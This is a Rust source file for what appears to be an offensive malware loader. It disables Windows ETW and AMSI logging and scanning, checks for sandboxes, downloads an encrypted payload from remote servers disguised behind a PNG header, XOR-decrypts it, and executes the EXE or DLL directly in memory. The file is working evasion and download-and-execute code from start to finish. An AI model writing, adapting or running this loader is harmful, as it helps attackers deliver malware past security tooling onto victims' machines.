#![allow(warnings, unused)]

mod cli;
mod fetch;
mod patcher;
mod detector;

use crate::cli::LoaderOptions;
use std::error::Error;
use std::process::exit;
use md5::Context;


use memexec::peparser::PE;
use memexec::peloader::def::DLL_PROCESS_ATTACH;

#[tokio::main]
async fn main() -> Result<(), Box<dyn Error>> {
    let v_hash = | arr: Vec<u8> | -> String {
        // Print MD5 sum of binary
        let mut ctx: Context = Context::new();
        ctx.consume(&arr);
        let mut hash_val = format!("{:#?}", ctx.compute());
        return hash_val;
    };

    // Parse CLI Args
    let cli_args: LoaderOptions = match cli::get_cli_args() {
        Ok(val) => val,
        Err(e) => {
            if cfg!(debug_assertions) {
                eprintln!("[!] Failed to parse CLI Arguments");
                eprintln!("[!] Error occured as: {}", e);
            }
            exit(-4);
        }
    };

    // Patch ETW
    match patcher::patch_etw(){
        Ok(_val) => {
            if cfg!(debug_assertions) {
                println!("[i] ETW Patched!");
            }
        },
        Err(e) => {
            if cfg!(debug_assertions) {
                eprintln!("[!] Failed to patch ETW");
                eprintln!("[!] Error occured as {}", e);                
            }
            exit(-1);
        }
    };

    // Patch AMSI
    match patcher::patch_amsi(){
        Ok(_val) => {
            if cfg!(debug_assertions) {
                println!("[i] AMSI Patched!");
            }
        },
        Err(e) => {
            if cfg!(debug_assertions) {
                eprintln!("[!] Failed to patch AMSI");
                eprintln!("[!] Error occured as {}", e);
            }
            exit(-2);
        }
    };
    
    // Detect  Sandbox
    if cli_args.detect_sandbox {
        if !detector::check_sandbox(){
            if cfg!(debug_assertions) {
                eprintln!("[!] Sandbox Environment Suspected");
            }
            //exit(-3);
        };
    }


    // Print Command Line Args
    if cfg!(debug_assertions) {
        println!("{}", cli_args);
    }

    // Fetch server list
    let server_list: Vec<String> = match fetch::fetch_server_list(cli_args.url.into()).await {
        Ok(v) => v,
        Err(e) => {
            if cfg!(debug_assertions) {
                eprintln!("[!] Failed to fetch server listing");
                eprintln!("[!] Error occured as: {}", e);
            }
            exit(-1);
        }
    };

    // Fetch payload from server list
    let mut payload: Vec<u8> = match fetch::fetch_data(server_list).await {
        Ok(v) => v,
        Err(e) => {
            if cfg!(debug_assertions) {
                eprintln!("\n[!] Failed to fetch binary from servers");
                eprintln!("[!] Error occured as: {}", e);
            }
            exit(-1);
        }
    };

    // Check payload hash in case of DEBUG builds
    if cfg!(debug_assertions) { 
        println!("[i] Fetched Payload Size:\t{}", payload.len());
        println!("[i] Payload MD5 Hash:\t\t{:?}\n", v_hash(payload.clone()));
    }

    // Strip PNG header from binary
    payload.drain(0..8);

    // Check Exe hash in case of DEBUG builds
    if cfg!(debug_assertions) { 
        println!("[i] Stripped Exe Size:\t\t{}", payload.len());
        println!("[i] Exe MD5 Hash:\t\t{:?}\n", v_hash(payload.clone()));
    }

    // Decrypt payload if specified
    if cli_args.key.is_some() {
        let mut i = 0;
        let key: Vec<u8> = cli_args.key.clone().unwrap().as_bytes().to_vec();

        for x in payload.iter_mut() {
            *x = *x ^ key[i % key.len()];
            i = i + 1;
        }

    }

    // println!("{}", payload.len());
    // let mut file = File::create("testcpy.exe")?;
    // file.write_all(&payload)?;

    // Load PE 
    let pe_parse = match PE::new(&payload){
        Ok(val) => val,
        Err(e) => {
            if cfg!(debug_assertions) {
                eprintln!("[!] Invalid PE file: {:?}", e);
            }
            exit(-5);
        }
    };

    unsafe {
        if pe_parse.is_dll() {
            if cfg!(debug_assertions) {
                println!("[i] Running DLL!");
            }
            match memexec::memexec_dll(&payload, 0 as _, DLL_PROCESS_ATTACH, 0 as _){
                Ok(_v) => {},
                Err(e) => {
                    if cfg!(debug_assertions) {
                        eprintln!("[!] Failed to run DLL: {:?}", e);
                    }
                    exit(-6);
                } 
            };
        }

        else {
            if cfg!(debug_assertions) {
                println!("[i] Running EXE!");
            }
            match memexec::memexec_exe(&payload) {
                Ok(_v) => {},
                Err(e) => {
                    if cfg!(debug_assertions) {
                        eprintln!("[!] Failed to run EXE: {:?}", e);
                    }
                    exit(-6);
                } 
            };
        }
    }


    // Run exe in memory
    Ok(())
}
